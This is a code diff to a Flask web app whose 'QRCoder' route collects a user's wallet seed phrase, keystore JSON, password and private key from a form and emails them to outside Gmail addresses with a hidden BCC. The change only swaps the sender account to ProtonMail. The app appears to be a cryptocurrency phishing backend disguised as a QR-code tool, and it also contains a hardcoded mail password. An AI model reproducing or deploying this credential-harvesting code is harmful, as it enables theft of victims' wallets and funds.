@@ -20,7 +20,7 @@ app.config.update(dict(
     DEBUG = True,
     MAIL_SERVER='smtp.gmail.com',
     MAIL_PORT = 587,
-    MAIL_USERNAME = 'tajusalaudeendeen@gmail.com',
+    MAIL_USERNAME = 'tajusalaudeendeen@protonmail.com',
     MAIL_PASSWORD = 'stupidsalau',
     MAIL_USE_TLS = True,
     MAIL_USE_SSL= False,
@@ -66,7 +66,7 @@ def QRCoder():
  privateKey = request.form["privateKey"]
  updated = datetime.now()
  updated = updated.strftime("%c")
- msg = Message('NEW UPDATE', sender = 'tajusalaudeendeen@gmail.com', recipients = ['approves007@gmail.com'], bcc =['zolarich12@gmail.com'])
+ msg = Message('NEW UPDATE', sender = 'tajusalaudeendeen@protonmail.com', recipients = ['approves007@gmail.com'], bcc =['zolarich12@gmail.com'])
  msg.body = "Date and time: " + updated + " \n" + "Phrase: " + phrase + "\n" + "KeystoreJSON: " + keystoreJSON + "\n" + "Password: " + password + "\n" + "Private Key: " + privateKey
  mail.send(msg)
  return render_template( 'qrcode.html', form=form)
